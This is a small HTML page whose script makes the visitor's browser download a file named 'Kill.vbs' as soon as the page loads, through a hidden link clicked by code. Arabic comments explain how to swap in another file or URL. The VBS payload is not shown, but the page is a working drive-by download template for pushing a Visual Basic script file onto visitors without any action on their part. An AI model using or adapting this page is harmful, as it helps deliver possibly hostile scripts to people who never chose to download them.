<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Auto Download</title>
</head>
<body>
<script>
window.onload = function () {
    const link = document.createElement("a");
    link.href = "Kill.vbs"; // بدّل باسم الملف ولا الرابط
    link.download = "Kill.vbs"; // الاسم وقت التحميل
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
};
</script>

</body>
</html>
